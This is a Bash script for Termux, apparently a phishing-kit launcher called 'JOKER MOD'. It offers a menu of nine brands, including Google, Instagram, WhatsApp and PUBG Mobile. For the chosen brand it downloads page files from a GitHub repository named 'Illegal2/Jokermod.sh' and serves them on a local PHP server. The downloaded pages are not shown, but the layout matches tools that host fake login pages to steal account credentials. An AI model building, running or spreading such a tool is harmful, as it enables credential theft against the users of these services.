#!/bin/bash

# Renk kodları
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

# GitHub repo adresin
GITHUB_REPO="https://raw.githubusercontent.com/Illegal2/Jokermod.sh/main"

# Joker Mod başlık
clear
echo -e "${RED}=====================================${NC}"
echo -e "${CYAN}         JOKER MOD - Sürüm 3.9       ${NC}"
echo -e "${RED}=====================================${NC}"
echo -e "${YELLOW}Kurucu   : illegal_14${NC}"
echo -e "${YELLOW}Telegram : https://t.me/+dQ3TyitUfjkyYzE0${NC}"
echo -e ""

# Gerekli paketlerin yüklenmesi
echo -e "${GREEN}Gerekli paketler yükleniyor...${NC}"
pkg update -y && pkg upgrade -y
pkg install -y php wget unzip

# Sunucu dizini
SERVER_DIR="$HOME/JOKER_MOD"
mkdir -p "$SERVER_DIR"
cd "$SERVER_DIR"

# Menü
while true; do
    clear
    echo -e "${RED}=====================================${NC}"
    echo -e "${CYAN}         JOKER MOD - Sürüm 3.9       ${NC}"
    echo -e "${RED}=====================================${NC}"
    echo -e "${GREEN}1) Google${NC}"
    echo -e "${GREEN}2) TikTok${NC}"
    echo -e "${GREEN}3) Roblox${NC}"
    echo -e "${GREEN}4) GitHub${NC}"
    echo -e "${GREEN}5) Instagram${NC}"
    echo -e "${GREEN}6) PUBG Mobile${NC}"
    echo -e "${GREEN}7) WhatsApp${NC}"
    echo -e "${GREEN}8) Twitter${NC}"
    echo -e "${GREEN}9) Facebook${NC}"
    echo -e "${RED}0) Çıkış${NC}"
    echo -n "Bir hizmet seçin: "
    read choice

    # Çıkış kontrolü
    if [ "$choice" -eq 0 ]; then
        echo "Çıkılıyor..."
        exit 0
    fi

    # Seçim kontrolü (1-9 arasında olmalı)
    if [[ "$choice" =~ ^[1-9]$ ]]; then
        TARGET="$choice"
    else
        echo -e "${RED}Geçersiz seçim!${NC}"
        sleep 1
        continue
    fi

    # Önceki klasörü temizle
    rm -rf "$SERVER_DIR/$TARGET"
    mkdir -p "$SERVER_DIR/$TARGET"

    # Seçilen hizmetin dosyalarını GitHub'dan indirme
    echo -e "${YELLOW}$TARGET için dosyalar indiriliyor...${NC}"
    wget -q --show-progress "$GITHUB_REPO/site/$TARGET.zip" -O "$TARGET.zip"
    unzip -q "$TARGET.zip" -d "$SERVER_DIR/$TARGET"
    rm "$TARGET.zip"

    # PHP sunucusunu başlatma
    cd "$SERVER_DIR/$TARGET"
    
    if [ -f "index.php" ]; then
        echo -e "${GREEN}$TARGET sanal sunucu başlatılıyor...${NC}"
        php -S 127.0.0.1:8080 > /dev/null 2>&1 &
        sleep 2
        echo -e "${CYAN}Site çalışıyor!${NC}"
        echo -e "${YELLOW}Bağlantı: http://127.0.0.1:8080${NC}"
    else
        echo -e "${RED}index.php dosyası bulunamadı!${NC}"
    fi

    read -p "Devam etmek için Enter'a basın..."
done
